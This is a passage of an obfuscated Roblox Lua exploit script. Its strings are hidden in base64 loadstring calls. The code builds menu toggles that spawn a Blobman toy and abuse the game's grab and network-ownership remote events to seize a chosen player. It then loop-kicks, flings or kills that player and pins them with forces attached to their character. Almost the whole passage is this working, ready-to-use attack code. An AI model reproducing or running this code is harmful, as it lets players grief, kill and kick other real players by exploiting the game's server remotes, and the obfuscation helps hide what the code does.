                                    RS.MenuToys.SpawnToyRemoteFunction:InvokeServer(
                                        loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))(),
                                        Root.CFrame * CFrame.new(0, 5, 5),
                                        Vector3.zero
                                    )
                                end)
                                -- Attend que le blob apparaisse
                                local t0 = tick()
                                repeat
                                    R.Heartbeat:Wait()
                                    folder = workspace:FindFirstChild(Player.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                                    blob = folder and folder:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))())
                                until blob or tick() - t0 > 5 or not GetToggleState(loadstring(base64decode("QXV0byBTaXQgQmxvYm1hbg=="))())
                            end

                            -- Sit sur le blob
                            if blob then
                                local seat = blob:FindFirstChildWhichIsA(loadstring(base64decode("VmVoaWNsZVNlYXQ="))())
                                if seat then
                                    Root.CFrame = seat.CFrame * CFrame.new(0, 1, 0)
                                    Root.Velocity = Vector3.zero
                                    seat:Sit(Hum)
                                end
                            end
                        end
                        task.wait(0.1)
                    end
                end)
            end
        end
    })
end
do

    local modeOptions = {
        loadstring(base64decode("TG9vcCBLaWNrIEJsb2I="))(),
        loadstring(base64decode("WE9DVSAoZ3JhYiArIGJsb2Ip"))(),
        loadstring(base64decode("WE9DVSBzcGFtIGJsb2IgbG9vcA=="))(),
        loadstring(base64decode("WE9DVSBLaWxsIEJsb2IgW0Zhc3Rd"))()
    }

    local selectedBlobMode = loadstring(base64decode("TG9vcCBLaWNrIEJsb2I="))()
    local blobActive = false
    local blobTask = nil
    local blobConnections = {}

    local function cleanupBlob()
        for _, conn in ipairs(blobConnections) do
            pcall(function() conn:Disconnect() end)
        end
        blobConnections = {}
        if blobTask then
            task.cancel(blobTask)
            blobTask = nil
        end
        blobActive = false
    end

    BlobGroup:CreateDropdown({
        Name = loadstring(base64decode("U2VsZWN0IEJsb2IgTW9kZQ=="))(),
        Items = modeOptions,
        Default = loadstring(base64decode("TG9vcCBLaWNrIEJsb2I="))(),
        Callback = function(Value)
            selectedBlobMode = Value
        end
    })

    BlobGroup:CreateToggle({
        Name = loadstring(base64decode("RW5hYmxlIEJsb2IgTWV0aG9k"))(),
        Default = false,
        Callback = function(State)
            if not State then
                cleanupBlob()
                return
            end

            if blobActive then
                cleanupBlob()
            end

            blobActive = State

            local targetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
            if not targetName or targetName == loadstring(base64decode(""))() then
                Library:Notify({ Title = loadstring(base64decode("RXJyb3I="))(), Description = loadstring(base64decode("U2VsZWN0IHRhcmdldCBmaXJzdCE="))(), Duration = 3 })
                blobActive = false
                return
            end

            if selectedBlobMode == loadstring(base64decode("TG9vcCBLaWNrIEJsb2I="))() then
                blobTask = task.spawn(function()
                    local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
                    local RS = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
                    local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
                    local LocalPlayer = Players.LocalPlayer
                    local GE = RS:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())

                    local REMOTE_DELAY = 0.002
                    local lastRemote = 0
                    local blobLoop = true

                    local function BlobGrabKickHard()
                        local target = Players:FindFirstChild(targetName)
                        if not target then 
                            warn(loadstring(base64decode("VGFyZ2V0IG5vdCBmb3VuZA=="))())
                            blobActive = false
                            return 
                        end

                        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                        local hum = char:WaitForChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                        local seat = hum.SeatPart
                        if not seat or seat.Parent.Name ~= loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))() then
                            Library:Notify({ Title = loadstring(base64decode("RXJyb3I="))(), Description = loadstring(base64decode("U2l0IG9uIEJsb2JtYW4gZmlyc3Qh"))(), Duration = 3 })
                            blobActive = false
                            return
                        end

                        local blob = seat.Parent
                        local blobRoot = blob:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) or blob.PrimaryPart
                        local scriptObj = blob:WaitForChild(loadstring(base64decode("QmxvYm1hblNlYXRBbmRPd25lclNjcmlwdA=="))())
                        local CG = scriptObj:WaitForChild(loadstring(base64decode("Q3JlYXR1cmVHcmFi"))())
                        local CD = scriptObj:WaitForChild(loadstring(base64decode("Q3JlYXR1cmVEcm9w"))())

                        local R_Det = blob:WaitForChild(loadstring(base64decode("UmlnaHREZXRlY3Rvcg=="))())

                        local savedPos = blobRoot.CFrame
                        local dragging = false
                        local grabStartTime = 0

                        while blobLoop and blobActive do
                            local currentTarget = Players:FindFirstChild(targetName)
                            if not currentTarget then break end

                            char = LocalPlayer.Character
                            hum = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                            seat = hum and hum.SeatPart
                            if not seat or seat.Parent.Name ~= loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))() then
                                warn(loadstring(base64decode("U3RvcHBlZDogbGVmdCBCbG9ibWFu"))())
                                break
                            end

                            blob = seat.Parent
                            blobRoot = blob:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) or blob.PrimaryPart

                            local tChar = currentTarget.Character
                            local tRoot = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                            local tHum = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())

                            if tRoot and tHum and tHum.Health > 0 and blobRoot then
                                tRoot.Velocity = Vector3.zero

                                if not dragging then
                                    blobRoot.CFrame = tRoot.CFrame
                                    blobRoot.Velocity = Vector3.zero

                                    if tick() - lastRemote >= REMOTE_DELAY then
                                        lastRemote = tick()

                                        pcall(function()
                                            tHum.PlatformStand = true
                                            tHum.Sit = true
                                            GE.SetNetworkOwner:FireServer(tRoot, blobRoot.CFrame)
                                            GE.DestroyGrabLine:FireServer(tRoot)
                                        end)
                                    end

                                    if grabStartTime == 0 then
                                        grabStartTime = tick()
                                    end

                                    if tick() - grabStartTime > 0.35 then
                                        dragging = true
                                        grabStartTime = 0
                                        blobRoot.CFrame = savedPos
                                        blobRoot.Velocity = Vector3.zero
                                    end
                                else
                                    blobRoot.CFrame = savedPos
                                    blobRoot.Velocity = Vector3.zero

                                    local lockPos = savedPos * CFrame.new(0, 23, 0)
                                    tRoot.CFrame = lockPos
                                    tHum.PlatformStand = true
                                    tHum.Sit = true

                                    if tick() - lastRemote >= REMOTE_DELAY then
                                        lastRemote = tick()

                                        pcall(function()
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.DestroyGrabLine:FireServer(tRoot)

                                            local weld = R_Det:FindFirstChild(loadstring(base64decode("UmlnaHRXZWxk"))()) or R_Det:FindFirstChildWhichIsA(loadstring(base64decode("V2VsZA=="))())
                                            if weld then
                                                CD:FireServer(weld)
                                                CG:FireServer(R_Det, tRoot, weld)
                                            end
                                        end)
                                    end
                                end
                            else
                                dragging = false
                                grabStartTime = 0
                            end

                            RunService.Heartbeat:Wait()
                        end

                        if blobRoot then
                            blobRoot.CFrame = savedPos
                            blobRoot.Velocity = Vector3.zero
                        end
                    end

                    task.spawn(BlobGrabKickHard)
                end)

            elseif selectedBlobMode == loadstring(base64decode("WE9DVSAoZ3JhYiArIGJsb2Ip"))() then
                blobTask = task.spawn(function()
                    local RS = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
                    local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
                    local GE = RS:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
                    
                    local myChar = LocalPlayer.Character
                    local myRoot = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    
                    if not myRoot then 
                        blobActive = false
                        return 
                    end

                    local savedPos = myRoot.CFrame
                    local dragging = false
                    local grabStartTime = 0
                    local customKickHeight = 20

                    while blobActive do
                        local target = selectedKickPlayer
                        if not target or not target.Parent or not target.Character then break end
                        
                        local tChar = target.Character
                        local tRoot = tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local tHum = tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                        
                        local seat = myChar and myChar.Humanoid.SeatPart
                        
                        if tRoot and tHum and tHum.Health > 0 then
                            tRoot.AssemblyLinearVelocity = Vector3.zero
                            tRoot.Velocity = Vector3.zero

                            if seat then
                                local blobman = seat.Parent
                                local remoteFolder = blobman:FindFirstChild(loadstring(base64decode("QmxvYm1hblNlYXRBbmRPd25lclNjcmlwdA=="))())
                                local grab = remoteFolder and remoteFolder:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVHcmFi"))())
                                local drop = remoteFolder and remoteFolder:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVEcm9w"))())
                                
                                local L_Det = blobman:FindFirstChild(loadstring(base64decode("TGVmdERldGVjdG9y"))())
                                local R_Det = blobman:FindFirstChild(loadstring(base64decode("UmlnaHREZXRlY3Rvcg=="))())
                                local L_Weld = L_Det and (L_Det:FindFirstChild(loadstring(base64decode("TGVmdFdlbGQ="))()) or L_Det:FindFirstChild(loadstring(base64decode("UmlnaWRDb25zdHJhaW50"))()))
                                local R_Weld = R_Det and (R_Det:FindFirstChild(loadstring(base64decode("UmlnaHRXZWxk"))()) or R_Det:FindFirstChild(loadstring(base64decode("UmlnaWRDb25zdHJhaW50"))()))

                                if grab and drop and L_Weld and R_Weld then
                                    pcall(function()
                                        grab:FireServer(L_Det, tRoot, L_Weld)
                                        grab:FireServer(R_Det, tRoot, R_Weld)
                                        drop:FireServer(L_Weld, tRoot)
                                        drop:FireServer(R_Weld, tRoot)
                                    end)
                                end
                            end

                            if not dragging then
                                myRoot.CFrame = tRoot.CFrame
                                if GE then
                                    pcall(function()
                                        tHum.PlatformStand = true
                                        GE.SetNetworkOwner:FireServer(tRoot, myRoot.CFrame)
                                        GE.CreateGrabLine:FireServer(tRoot, Vector3.zero, tRoot.Position, false)
                                    end)
                                end
                                
                                if grabStartTime == 0 then grabStartTime = tick() end
                                if tick() - grabStartTime > 0.3 then
                                    dragging = true
                                    grabStartTime = 0
                                end
                            else
                                local lockPos = savedPos * CFrame.new(0, customKickHeight, 0)
                                myRoot.CFrame = savedPos
                                tRoot.CFrame = lockPos
                                
                                if GE then
                                    pcall(function()
                                        tHum.PlatformStand = true
                                        GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                        GE.DestroyGrabLine:FireServer(tRoot)
                                        GE.CreateGrabLine:FireServer(tRoot, Vector3.zero, tRoot.Position, false)
                                    end)
                                end
                            end
                        else
                            dragging = false
                            grabStartTime = 0
                        end
                        
                        RunService.Heartbeat:Wait()
                    end

                    if myRoot and savedPos then
                        myRoot.CFrame = savedPos
                    end
                    blobActive = false
                end)

            elseif selectedBlobMode == loadstring(base64decode("WE9DVSBzcGFtIGJsb2IgbG9vcA=="))() then
                blobTask = task.spawn(function()
                    while blobActive do
                        local target = selectedKickPlayer
                        local char = LocalPlayer.Character
                        local seat = char and char.Humanoid.SeatPart
                        
                        if not seat or not target or not target.Character then
                            task.wait(0.5)
                            continue
                        end
                        
                        local blobman = seat.Parent
                        local remoteFolder = blobman:FindFirstChild(loadstring(base64decode("QmxvYm1hblNlYXRBbmRPd25lclNjcmlwdA=="))())
                        local grab = remoteFolder and remoteFolder:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVHcmFi"))())
                        local drop = remoteFolder and remoteFolder:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVEcm9w"))())
                        
                        local targetHRP = target.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local L_Det = blobman:FindFirstChild(loadstring(base64decode("TGVmdERldGVjdG9y"))())
                        local R_Det = blobman:FindFirstChild(loadstring(base64decode("UmlnaHREZXRlY3Rvcg=="))())
                        
                        local L_Weld = L_Det and (L_Det:FindFirstChild(loadstring(base64decode("TGVmdFdlbGQ="))()) or L_Det:FindFirstChild(loadstring(base64decode("UmlnaWRDb25zdHJhaW50"))()))
                        local R_Weld = R_Det and (R_Det:FindFirstChild(loadstring(base64decode("UmlnaHRXZWxk"))()) or R_Det:FindFirstChild(loadstring(base64decode("UmlnaWRDb25zdHJhaW50"))()))

                        if targetHRP and grab and drop and L_Weld and R_Weld then
                            pcall(function()
                                grab:FireServer(L_Det, targetHRP, L_Weld)
                                grab:FireServer(R_Det, targetHRP, R_Weld)
                                drop:FireServer(L_Weld, targetHRP)
                                drop:FireServer(R_Weld, targetHRP)
                            end)
                        end
                        
                        task.wait() 
                    end
                end)

            elseif selectedBlobMode == loadstring(base64decode("WE9DVSBLaWxsIEJsb2IgW0Zhc3Rd"))() then
                blobTask = task.spawn(function()
                    while blobActive do
                        pcall(function()
                            local char = LocalPlayer.Character
                            local seat = char and char.Humanoid.SeatPart
                            local Blob = seat and seat.Parent
                            
                            if Blob and Blob.Name == loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))() then
                                local remotes = Blob:FindFirstChild(loadstring(base64decode("QmxvYm1hblNlYXRBbmRPd25lclNjcmlwdA=="))())
                                local CG = remotes and remotes:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVHcmFi"))())
                                local CD = remotes and remotes:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVSZWxlYXNl"))())
                                local weld = Blob.RightDetector:FindFirstChild(loadstring(base64decode("UmlnaHRXZWxk"))()) or Blob.RightDetector:FindFirstChild(loadstring(base64decode("UmlnaWRDb25zdHJhaW50"))())
                                
                                local HRP = Blob.HumanoidRootPart
                                local pos = HRP.CFrame

                                local target = selectedKickPlayer
                                if target and target.Character and target.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) and target.Character.Humanoid.Health > 0 then
                                    HRP.CFrame = target.Character.HumanoidRootPart.CFrame
                                    task.wait(0.05)
                                    
                                    local startTime = tick()
                                    repeat 
                                        CG:FireServer(nil, target.Character.HumanoidRootPart, weld)
                                        CD:FireServer(weld)
                                        HRP.CFrame = target.Character.HumanoidRootPart.CFrame
                                        task.wait() 
                                    until not blobActive or isnetworkowner(target.Character.HumanoidRootPart) or (tick() - startTime > 2)
                                    
                                    target.Character.Humanoid:ChangeState(loadstring(base64decode("RGVhZA=="))())
                                    if stvel then 
                                        stvel(HRP) 
                                    end
                                    HRP.CFrame = pos
                                end
                            end
                        end)

                        if not blobActive then break end
                        task.wait(0.1)
                    end
                end)
            end
        end
    })
end

do
    local oatsKickActive = false
    local oatsKickTask = nil

    ChooseGroup:CreateToggle({
        Name = loadstring(base64decode("WG9jdSBLaWNrKEJlc3Qp"))(),
        Flag = loadstring(base64decode("T2F0c0tpY2s="))(),
        Default = false,
        Callback = function(Value)
            if SetToggleState then SetToggleState(loadstring(base64decode("T2F0c0tpY2s="))(), Value) end
            oatsKickActive = Value
            
            local function sno(part)
                pcall(function()
                    local grabEvents = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()):FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
                    local setNetOwner = grabEvents and grabEvents:FindFirstChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
                    if setNetOwner then
                        setNetOwner:FireServer(part, part.CFrame)
                    end
                end)
            end
            
            if Value then
                local targetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
                if not targetName or targetName == loadstring(base64decode(""))() then
                    oatsKickActive = false
                    Library:Notify({ Title = loadstring(base64decode("RXJyb3I="))(), Content = loadstring(base64decode("U2VsZWN0IHRhcmdldCBmaXJzdCE="))(), Duration = 3 })
                    if SetToggleState then SetToggleState(loadstring(base64decode("T2F0c0tpY2s="))(), false) end
                    return
                end
                
                oatsKickTask = task.spawn(function()
                    local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
                    local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
                    
                    local myChar = LocalPlayer.Character
                    local myHRP = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if not (myChar and myHRP) then
                        oatsKickActive = false
                        return
                    end

                    local savedPos = myHRP.CFrame
                    local lastRemoteFire = tick()

                    while oatsKickActive and RunService.Heartbeat:Wait() do
                        local currentTargetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
                        local targetPlayer = currentTargetName and game:GetService(loadstring(base64decode("UGxheWVycw=="))()):FindFirstChild(currentTargetName)
                        
                        -- Target validation fix to prevent errors if target leaves or resets
                        if not targetPlayer or not targetPlayer.Character then
                            break
                        end

                        myChar = LocalPlayer.Character
                        myHRP = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local myHead = myChar and myChar:FindFirstChild(loadstring(base64decode("SGVhZA=="))())

                        local tChar = targetPlayer.Character
                        local tHRP = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local tHum = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())

                        if not (myChar and myHRP and myHead) or not (tHRP and tHum) or tHum.Health <= 0 then
                            continue
                        end

                        local dist = (tHRP.Position - myHRP.Position).Magnitude

                        if dist > 30 then
                            pcall(function()
                                myChar:PivotTo(tHRP.CFrame * CFrame.new(0, 2, 4))
                            end)
                            
                            sno(tHRP)

                            if not tHRP:FindFirstChild(loadstring(base64decode("S2lja0FsaWdu"))()) then
                                local oldBp = tHRP:FindFirstChildOfClass(loadstring(base64decode("Qm9keVBvc2l0aW9u"))())
                                if oldBp then oldBp:Destroy() end

                                local att0 = Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))(), tHRP)
                                att0.Name = loadstring(base64decode("S2lja0F0dDA="))()
                                
                                local att1 = Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))(), workspace.Terrain)
                                att1.Name = loadstring(base64decode("S2lja0F0dDE="))()

                                local alignPos = Instance.new(loadstring(base64decode("QWxpZ25Qb3NpdGlvbg=="))())
                                alignPos.Name = loadstring(base64decode("S2lja0FsaWdu"))()
                                alignPos.Attachment0 = att0
                                alignPos.Attachment1 = att1
                                alignPos.MaxForce = math.huge
                                alignPos.Responsiveness = 200
                                alignPos.Parent = tHRP

                                local alignRot = Instance.new(loadstring(base64decode("QWxpZ25PcmllbnRhdGlvbg=="))())
                                alignRot.Name = loadstring(base64decode("S2lja1JvdA=="))()
                                alignRot.Attachment0 = att0
                                alignRot.Mode = Enum.OrientationAlignmentMode.OneAttachment
                                alignRot.CFrame = CFrame.new() 
                                alignRot.MaxTorque = math.huge
                                alignRot.Responsiveness = 200
                                alignRot.Parent = tHRP
                            end

                            local grabStartTime = tick()
                            while (tick() - grabStartTime) < 0.3 and oatsKickActive do
                                task.wait(0.05)
                                sno(tHRP)
                                pcall(function()
                                    local grabEvents = ReplicatedStorage:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
                                    local destroyLine = grabEvents and grabEvents:FindFirstChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))())
                                    if destroyLine then
                                        destroyLine:FireServer(tHRP)
                                    end
                                end)
                                
                                local align = tHRP:FindFirstChild(loadstring(base64decode("S2lja0FsaWdu"))())
                                if myHead and align and align.Attachment1 then
                                    align.Attachment1.WorldPosition = myHead.Position + Vector3.new(0, 15, 0)
                                end
                            end

                            if oatsKickActive then
                                pcall(function()
                                    myChar:PivotTo(savedPos)
                                    tHRP.CFrame = savedPos * CFrame.new(0, 15, 0)
                                end)
                            end
                            
                            continue
                        end

                        if not tHRP:FindFirstChild(loadstring(base64decode("S2lja0FsaWdu"))()) then
                            local oldBp = tHRP:FindFirstChildOfClass(loadstring(base64decode("Qm9keVBvc2l0aW9u"))())
                            if oldBp then oldBp:Destroy() end

                            local att0 = Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))(), tHRP)
                            att0.Name = loadstring(base64decode("S2lja0F0dDA="))()
                            
                            local att1 = Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))(), workspace.Terrain)
                            att1.Name = loadstring(base64decode("S2lja0F0dDE="))()

                            local alignPos = Instance.new(loadstring(base64decode("QWxpZ25Qb3NpdGlvbg=="))())
                            alignPos.Name = loadstring(base64decode("S2lja0FsaWdu"))()
                            alignPos.Attachment0 = att0
                            alignPos.Attachment1 = att1
                            alignPos.MaxForce = math.huge
                            alignPos.Responsiveness = 200
                            alignPos.Parent = tHRP

                            local alignRot = Instance.new(loadstring(base64decode("QWxpZ25PcmllbnRhdGlvbg=="))())
                            alignRot.Name = loadstring(base64decode("S2lja1JvdA=="))()
                            alignRot.Attachment0 = att0
                            alignRot.Mode = Enum.OrientationAlignmentMode.OneAttachment
                            alignRot.CFrame = CFrame.new() 
                            alignRot.MaxTorque = math.huge
                            alignRot.Responsiveness = 200
                            alignRot.Parent = tHRP
                        end

                        sno(tHRP)

                        local align = tHRP:FindFirstChild(loadstring(base64decode("S2lja0FsaWdu"))())
                        if align and align.Attachment1 and oatsKickActive then
                            align.Attachment1.WorldPosition = myHead.Position + Vector3.new(0, 20, 0)
                        end

                        local rot = tHRP:FindFirstChild(loadstring(base64decode("S2lja1JvdA=="))())
                        if rot then 
                            rot.CFrame = CFrame.Angles(0, 0, 0) 
                        end

                        if tick() - lastRemoteFire > 0.05 and oatsKickActive then
                            pcall(function()
                                local grabEvents = ReplicatedStorage:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
                                local destroyLine = grabEvents and grabEvents:FindFirstChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))())
                                if destroyLine then
                                    destroyLine:FireServer(tHRP)
                                end
                            end)
                            lastRemoteFire = tick()
                        end
                    end

                    -- Cleanup logic for target when toggle is disabled internally
                    local finalTargetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
                    local finalTarget = finalTargetName and game:GetService(loadstring(base64decode("UGxheWVycw=="))()):FindFirstChild(finalTargetName)
                    
                    if finalTarget and finalTarget.Character then
                        local tH = finalTarget.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if tH then
                            local align = tH:FindFirstChild(loadstring(base64decode("S2lja0FsaWdu"))())
                            local rot = tH:FindFirstChild(loadstring(base64decode("S2lja1JvdA=="))())
                            local att0 = tH:FindFirstChild(loadstring(base64decode("S2lja0F0dDA="))())
                            
                            if align then 
                                if align.Attachment1 then align.Attachment1:Destroy() end
                                align:Destroy() 
                            end
                            if rot then rot:Destroy() end
                            if att0 then att0:Destroy() end

                            pcall(function()
                                local grabEvents = ReplicatedStorage:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
                                local destroyLine = grabEvents and grabEvents:FindFirstChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))())
                                if destroyLine then
                                    destroyLine:FireServer(tH)
                                end
                            end)
                        end
                    end

                    oatsKickActive = false
                end)
            else
                oatsKickActive = false
                if oatsKickTask then
                    task.cancel(oatsKickTask)
                    oatsKickTask = nil
                end
                
                local currentTargetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
                local targetPlayer = currentTargetName and game:GetService(loadstring(base64decode("UGxheWVycw=="))()):FindFirstChild(currentTargetName)
                
                if targetPlayer and targetPlayer.Character then
                    local tH = targetPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if tH then
                        local align = tH:FindFirstChild(loadstring(base64decode("S2lja0FsaWdu"))())
                        local rot = tH:FindFirstChild(loadstring(base64decode("S2lja1JvdA=="))())
                        local att0 = tH:FindFirstChild(loadstring(base64decode("S2lja0F0dDA="))())
                        
                        if align then 
                            if align.Attachment1 then align.Attachment1:Destroy() end
                            align:Destroy() 
                        end
                        if rot then rot:Destroy() end
                        if att0 then att0:Destroy() end

                        pcall(function()
                            local grabEvents = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()):FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
                            local destroyLine = grabEvents and grabEvents:FindFirstChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))())
                            if destroyLine then
                                destroyLine:FireServer(tH)
                            end
                        end)
                    end
                end
            end
        end
    })
end

do
    local modeOptions = {
        loadstring(base64decode("WG9jdSBPd25lcnNoaXAgS2ljayg4MCsgZnBzKQ=="))(),
        loadstring(base64decode("T3duZXJzaGlwIEtpY2sgZmFzdA=="))(),
        loadstring(base64decode("T3duZXJzaGlwIEtpY2sgRm9yIEV4cGxvaXRlcg=="))(),
        loadstring(base64decode("WG9jdSBVUEdSQURFRCBPd25lcnNoaXAgS2ljaw=="))()
    }

    local selectedKickMode = loadstring(base64decode("WG9jdSBPd25lcnNoaXAgS2ljaw=="))()
    local ownershipKickActive = false
    local ownershipKickTask = nil
    local ownershipKickConnections = {}

    local function cleanupConnections()
        for _, conn in ipairs(ownershipKickConnections) do
            pcall(function() conn:Disconnect() end)
        end
        ownershipKickConnections = {}
        if ownershipKickTask then
            task.cancel(ownershipKickTask)
            ownershipKickTask = nil
        end
        ownershipKickActive = false
        
        pcall(function()
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
                local root = LocalPlayer.Character.HumanoidRootPart
                root.Anchored = false
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
            end
        end)
    end

    ChooseGroup:CreateDropdown({
        Name = loadstring(base64decode("U2VsZWN0IE93bmVyc2hpcCBNb2Rl"))(),
        Items = modeOptions,
        Default = loadstring(base64decode("WG9jdSBPd25lcnNoaXAgS2ljayg4MCsgZnBzKQ=="))(),
        Callback = function(Value)
            selectedKickMode = Value
        end
    })

    ChooseGroup:CreateToggle({
        Name = loadstring(base64decode("RW5hYmxlIE93bmVyc2hpcCBLaWNr"))(),
        Default = false,
        Callback = function(Value)
            if not Value then
                cleanupConnections()
                return
            end

            if ownershipKickActive then
                cleanupConnections()
            end

            ownershipKickActive = Value

            local targetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
            if not targetName or targetName == loadstring(base64decode(""))() then
                Library:Notify({ Title = loadstring(base64decode("RXJyb3I="))(), Description = loadstring(base64decode("U2VsZWN0IHRhcmdldCBmaXJzdCE="))(), Duration = 3 })
                ownershipKickActive = false
                return
            end

            local mode = selectedKickMode

            ownershipKickTask = task.spawn(function()
                local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
                local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
                local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
                local Workspace = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())
                local LocalPlayer = Players.LocalPlayer

                local target = Players:FindFirstChild(targetName)
                if not target then
                    ownershipKickActive = false
                    return
                end

                local GE = ReplicatedStorage:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
                local SetNetOwner = GE:WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
                local DestroyGrabLine = GE:WaitForChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))())
                
                local ZERO_VECTOR = Vector3.new(0, 0, 0)
                local HIDDEN_CF = CFrame.new(0, 1e9, 0)

                if mode == loadstring(base64decode("WG9jdSBPd25lcnNoaXAgS2ljayg4MCsgZnBzKQ=="))() then
                    local myChar = LocalPlayer.Character
                    local myRoot = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if not myRoot then
                        ownershipKickActive = false
                        return
                    end

                    local savedPos = myRoot.CFrame 
                    local dragging = false
                    local grabStartTime = 0
                    local checkStartTime = 0
                    
                    local currentFPS = 60
                    local fpsConnection = RunService.RenderStepped:Connect(function(dt)
                        currentFPS = 1 / dt
                    end)
                    table.insert(ownershipKickConnections, fpsConnection)

                    local bodyPos = nil
                    local bodyGyro = nil

                    local function cleanupBodies()
                        pcall(function()
                            if bodyPos then bodyPos:Destroy() bodyPos = nil end
                            if bodyGyro then bodyGyro:Destroy() bodyGyro = nil end
                        end)
                    end

                    local function createBodies(targetRoot, pos)
                        cleanupBodies()
                        
                        for _, v in pairs(targetRoot:GetChildren()) do
                            if v:IsA(loadstring(base64decode("Qm9keVBvc2l0aW9u"))()) or v:IsA(loadstring(base64decode("Qm9keUd5cm8="))()) then
                                v:Destroy()
                            end
                        end
                        
                        bodyPos = Instance.new(loadstring(base64decode("Qm9keVBvc2l0aW9u"))())
                        bodyPos.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                        bodyPos.D = 100
                        bodyPos.Position = pos
                        bodyPos.Parent = targetRoot
                        
                        bodyGyro = Instance.new(loadstring(base64decode("Qm9keUd5cm8="))())
                        bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
                        bodyGyro.D = 100
                        bodyGyro.CFrame = CFrame.new(pos)
                        bodyGyro.Parent = targetRoot
                    end

                    while ownershipKickActive do
                        local currentTargetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
                        local currentTarget = currentTargetName and Players:FindFirstChild(currentTargetName)
                        
                        if not currentTarget or not currentTarget.Character or not currentTarget.Parent then 
                            cleanupBodies()
                            break 
                        end
                        
                        myChar = LocalPlayer.Character
                        myRoot = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local tChar = currentTarget.Character
